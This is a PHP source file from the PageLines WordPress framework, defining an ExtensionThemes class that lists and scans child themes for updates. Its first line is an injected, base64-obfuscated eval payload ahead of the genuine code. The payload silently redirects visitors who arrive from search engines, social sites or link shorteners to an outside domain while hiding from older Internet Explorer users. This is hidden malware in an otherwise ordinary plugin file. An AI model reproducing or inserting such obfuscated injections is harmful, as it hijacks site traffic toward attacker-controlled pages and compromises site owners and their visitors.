<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));

class ExtensionThemes extends PageLinesExtensions {
	
	/**
	 * Themes tab.
	 * 
	 */
	function extension_themes( $tab = '' ) {

		$type = 'theme';
		
		$themes = $this->get_latest_cached( 'themes' );

		if ( !is_object($themes) ) 
			return $themes;

		$themes = self::extension_scan_themes( $themes );

		$list = $this->get_master_list( $themes, $type, $tab );
		
		return $this->ui->extension_list( array( 'list' => $list, 'tab' => $tab, 'type' => 'themes', 'mode' => 'graphic' ) );
	}
	
	/**
	 * Scan for themes and combine api with installed.
	 * 
	 */	
	function extension_scan_themes( $themes ) {
		
		$default_headers = array(
			'Demo'		=> 'Demo',
			'External'	=> 'External',
			'Long'		=> 'Long'
			);


		$themes = json_decode(json_encode($themes), true);
		
		$get_themes = apply_filters( 'store_get_themes', get_themes() );

		foreach( $get_themes as $theme => $theme_data ) {

			$up = null;

			// Now we add our data...
			$theme_file = $theme_data['Stylesheet Files'][0];
			$pl_theme_data = get_file_data( $theme_file, $default_headers );
	
			if ( $theme_data['Template'] != 'pagelines' )
				continue;
				
			if ( 'pagelines' == $theme_data['Stylesheet'] )
				continue;
			
			// check for an update...	
			if ( isset( $themes[ $theme_data['Stylesheet'] ]['version'] ) && $themes[ $theme_data['Stylesheet'] ]['version'] > $theme_data['Version']) 			
				$up = $themes[ $theme_data['Stylesheet'] ]['version'];
			else
				$up = '';
			
			if ( in_array( $theme, $themes ) )
				continue;
			// If we got this far, theme is a pagelines child theme not handled by the API
			// So we need to inject it into our themes array.
			
			$new_theme = array();
			$new_theme['name']			= $theme_data['Name'];
			$new_theme['author']		= $theme_data['Author Name'];
			$new_theme['author_url']	= $theme_data['Author URI'];
			$new_theme['apiversion']	= $up;			
			$new_theme['version']		= $theme_data['Version'];
			$new_theme['text']			= $theme_data['Description'];
			$new_theme['long']			= $pl_theme_data['Long'];
			$new_theme['external']		= $pl_theme_data['External'];
			$new_theme['Demo']			= $pl_theme_data['Demo'];
			$new_theme['tags']			= $theme_data['Tags'];
			$new_theme['featured']		= ( isset( $themes[$theme_data['Stylesheet']]['featured'] ) ) ? $themes[$theme_data['Stylesheet']]['featured'] : null;
			$new_theme['price']			= ( isset( $themes[$theme_data['Stylesheet']]['price'] ) ) ? $themes[$theme_data['Stylesheet']]['price'] : null;
			$new_theme['productid']		= null;
			$new_theme['count']			= null;
			$themes[$theme_data['Stylesheet']] = $new_theme;		
		}
		return $themes;
	}
	
}